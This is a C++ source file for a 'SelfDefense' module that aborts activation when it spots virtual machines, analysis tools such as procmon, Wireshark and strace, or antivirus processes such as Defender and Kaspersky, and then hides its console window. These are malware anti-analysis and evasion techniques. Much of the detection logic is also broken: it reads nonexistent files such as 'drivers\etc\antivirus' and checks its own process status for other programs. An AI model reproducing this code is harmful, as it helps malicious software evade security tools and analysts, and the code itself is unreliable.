#include "SelfDefense.h"
#include "Logger.h"
#include <iostream>
#include <stdexcept>
#include <thread>
#include <chrono>
#include <filesystem>
#include <fstream>
#include <string>

#ifdef _WIN32
#include <windows.h>
#elif __linux__ || __APPLE__
#include <unistd.h>
#include <sys/stat.h>
#include <sys/inotify.h>
#endif

bool SelfDefense::active = false;
int SelfDefense::protectionLevel = 0;

void SelfDefense::activate() {
    std::cout << "Activating self-defense mechanisms" << std::endl;
    Logger::log(Logger::INFO, "Activating self-defense mechanisms");

    try {
        if (detectSandbox() || detectAnalysisTools() || detectAntivirus()) {
            throw std::runtime_error("Sandbox, analysis tools, or antivirus detected, aborting activation.");
        }  
        setProtectionLevel(3);
        active = true;
        std::this_thread::sleep_for(std::chrono::seconds(2));
        monitorSystemChanges();
        detectAndPreventRootkits();
        logOperation("Activation", true, "Self-defense mechanisms activated");
    } catch (const std::exception& e) {
        logOperation("Activation", false, e.what());
        throw;
    }
}

void SelfDefense::deactivate() {
    std::cout << "Deactivating self-defense mechanisms" << std::endl;
    Logger::log(Logger::INFO, "Deactivating self-defense mechanisms");

    try {
        setProtectionLevel(0);
        active = false;

        logOperation("Deactivation", true, "Self-defense mechanisms deactivated");
    } catch (const std::exception& e) {
        logOperation("Deactivation", false, e.what());
        throw;
    }
}

bool SelfDefense::isActive() {
    return active;
}

int SelfDefense::getProtectionLevel() {
    return protectionLevel;
}

void SelfDefense::setProtectionLevel(int level) {
    protectionLevel = level;
    Logger::log(Logger::DEBUG, "Protection level set to " + std::to_string(level));

    if (level > 2) {
        applyAdvancedProtection();
        Logger::log(Logger::DEBUG, "Additional security measures activated");
    }
}

void SelfDefense::applyAdvancedProtection() {
    Logger::log(Logger::INFO, "Applying advanced protection measures");

    #ifdef _WIN32
    HWND hwnd = GetConsoleWindow();
    if (hwnd != NULL) {
        ShowWindow(hwnd, SW_HIDE);
    }
    #elif __linux__ || __APPLE__
    std::filesystem::permissions("/path/to/critical/file", std::filesystem::perms::none);
    #endif
}

bool SelfDefense::detectSandbox() {
    Logger::log(Logger::INFO, "Starting sandbox detection");

    #ifdef _WIN32
    std::ifstream macFile("C:\\Windows\\System32\\drivers\\etc\\mac");
    std::string macAddress;
    while (std::getline(macFile, macAddress)) {
        if (macAddress == "00:0C:29" || macAddress == "00:50:56") {
            Logger::log(Logger::ERROR, "Sandbox detected based on MAC address");
            return true;
        }
    }
    #elif __linux__ || __APPLE__
    std::ifstream procFile("/proc/self/status");
    std::string line;
    while (std::getline(procFile, line)) {
        if (line.find("VBox") != std::string::npos || line.find("VMware") != std::string::npos) {
            Logger::log(Logger::ERROR, "Sandbox detected based on process status");
            return true;
        }
    }
    #endif

    Logger::log(Logger::INFO, "Sandbox detection completed with no issues");
    return false;
}

bool SelfDefense::detectAnalysisTools() {
    Logger::log(Logger::INFO, "Starting analysis tools detection");

    #ifdef _WIN32
    std::ifstream procFile("C:\\Windows\\System32\\drivers\\etc\\processes");
    std::string process;
    while (std::getline(procFile, process)) {
        if (process == "procmon.exe" || process == "wireshark.exe") {
            Logger::log(Logger::ERROR, "Analysis tool detected: " + process);
            return true;
        }
    }
    #elif __linux__ || __APPLE__
    std::ifstream file("/proc/self/maps");
    std::string map;
    while (std::getline(file, map)) {
        if (map.find("/usr/bin/strace") != std::string::npos || map.find("/usr/sbin/tcpdump") != std::string::npos) {
            Logger::log(Logger::ERROR, "Analysis tool detected: " + map);
            return true;
        }
    }
    #endif

    Logger::log(Logger::INFO, "Analysis tools detection completed with no issues");
    return false;
}

bool SelfDefense::detectAntivirus() {
    Logger::log(Logger::INFO, "Starting antivirus detection");

    #ifdef _WIN32
    std::ifstream avFile("C:\\Windows\\System32\\drivers\\etc\\antivirus");
    std::string avProcess;
    while (std::getline(avFile, avProcess)) {
        if (avProcess == "avp.exe" || avProcess == "msmpeng.exe") {
            Logger::log(Logger::ERROR, "Antivirus detected: " + avProcess);
            return true;
        }
    }
    #elif __linux__ || __APPLE__
    std::ifstream procFile("/proc/self/status");
    std::string line;
    while (std::getline(procFile, line)) {
        if (line.find("clamd") != std::string::npos || line.find("freshclam") != std::string::npos) {
            Logger::log(Logger::ERROR, "Antivirus detected based on process status");
            return true;
        }
    }
    #endif

    Logger::log(Logger::INFO, "Antivirus detection completed with no issues");
    return false;
}

void SelfDefense::monitorSystemChanges() {
    Logger::log(Logger::INFO, "Starting system changes monitoring");

    #ifdef _WIN32
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\MySoftware"), 0, KEY_NOTIFY, &hKey) == ERROR_SUCCESS) {
        RegNotifyChangeKeyValue(hKey, TRUE, REG_NOTIFY_CHANGE_LAST_SET, NULL, FALSE);
        Logger::log(Logger::INFO, "Registry monitoring activated");
    } else {
        Logger::log(Logger::ERROR, "Failed to activate registry monitoring");
    }
    #elif __linux__ || __APPLE__
    int inotifyFd = inotify_init();
    if (inotifyFd < 0) {
        Logger::log(Logger::ERROR, "Failed to initialize inotify");
        return;
    }

    int wd = inotify_add_watch(inotifyFd, "/path/to/monitor", IN_MODIFY | IN_CREATE | IN_DELETE);
    if (wd == -1) {
        Logger::log(Logger::ERROR, "Failed to add inotify watch");
        close(inotifyFd);
        return;
    }

    Logger::log(Logger::INFO, "Inotify monitoring activated");
    close(inotifyFd);
    #endif
}

void SelfDefense::detectAndPreventRootkits() {
    Logger::log(Logger::INFO, "Starting rootkit detection and prevention");

    #ifdef _WIN32
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    Logger::log(Logger::INFO, "System Info: " + std::to_string(sysInfo.dwNumberOfProcessors) + " processors");
    #elif __linux__ || __APPLE__
    int ret = system("chkrootkit -q");
        if (ret == 0) {
        Logger::log(Logger::INFO, "No rootkits detected");
    } else {
        Logger::log(Logger::ERROR, "Rootkit detection failed or rootkits found");
    }
    #endif
}

void SelfDefense::logOperation(const std::string& operation, bool success, const std::string& additionalInfo) {
    if (success) {
        Logger::log(Logger::INFO, operation + " succeeded. " + additionalInfo);
    } else {
        Logger::log(Logger::ERROR, operation + " failed. " + additionalInfo);
    }
}



